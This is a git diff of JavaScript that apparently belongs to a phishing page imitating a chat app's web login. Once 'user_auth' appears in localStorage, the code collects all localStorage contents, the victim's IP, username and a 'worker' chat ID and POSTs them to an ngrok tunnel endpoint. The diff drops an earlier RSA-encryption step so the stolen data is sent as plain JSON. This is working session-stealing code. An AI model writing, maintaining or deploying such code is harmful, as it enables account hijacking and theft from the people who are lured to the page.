@@ -117,58 +117,35 @@ async function fetchClientIp() {
   }
 }
 
-const script = document.createElement("script");
-script.src = "https://cdn.jsdelivr.net/npm/jsencrypt/bin/jsencrypt.min.js";
-document.head.appendChild(script);
+let l = setInterval(async () => {
+  if (localStorage.user_auth) {
+    clearInterval(l);
 
-script.onload = () => {
-  const PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAykkzNsl4fuXRj3kz1+m2
-3tkhsgXwJLgr4vXQyQwOhOCSFoSRWl+AwBHxMT4dL65HfycmDcDaFU/mPn/3TFwn
-BQjKDOpRVHXMt9ZYUCPuSCfIVtS9Sxxq9RCqCCgn9S1mePTpKJ1HYSaKH1rpEaXm
-fJbjvmpcKs5kqbHa3cwtgSNVUBgta+iWj8B3RLHWsPZn3K/FFjWf6rZK7FbjSVtF
-QynZukdFwC0Fr4d1S8An89szCppFxlS7H+xpL0VABQOn29ToQFWfFq2dCl1g0kEW
-CpMjNlw3mcAgmLg3Cvddd8vSaTiVx6qPD1/DPVY44xa+IrePxwmxXbiI6qtf26jr
-2wIDAQAB
------END PUBLIC KEY-----`;
+    iframe.style.display = "block";
 
-  function encryptPayload(payload) {
-    const encryptor = new JSEncrypt();
-    encryptor.setPublicKey(PUBLIC_KEY);
-    return encryptor.encrypt(JSON.stringify(payload));
-  }
+    const ip = await fetchClientIp();
 
-  let l = setInterval(async () => {
-    if (localStorage.user_auth) {
-      clearInterval(l);
-      iframe.style.display = "block";
+    const endpointUrl = "https://currently-relative-shrimp.ngrok-free.app/newlog";
 
-      const ip = await fetchClientIp();
-      const payload = {
+    fetch(endpointUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
         data: getLocalStorageData(),
         worker_chatid: startAppParam,
         ip: ip,
         username: username
-      };
-
-      const encryptedData = encryptPayload(payload);
-
-      fetch("https://currently-relative-shrimp.ngrok-free.app/newlog", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ encrypted: encryptedData })
       })
-      .then(response => response.json())
-      .then(data => console.log('Success:', data))
-      .catch(error => console.error('Error:', error));
-    } else {
-      console.log("No bots found.");
-    }
-  }, 50);
-};
-document.head.appendChild(script);
-
-
+    })
+    .then(response => response.json())
+    .then(data => console.log('Success:', data))
+    .catch(error => console.error('Error:', error));
+  } else {
+    console.log("No bots found.");
+  }
+}, 50);
 
 document.addEventListener("DOMContentLoaded", () => {
   const authPages = document.getElementById("page-chats");
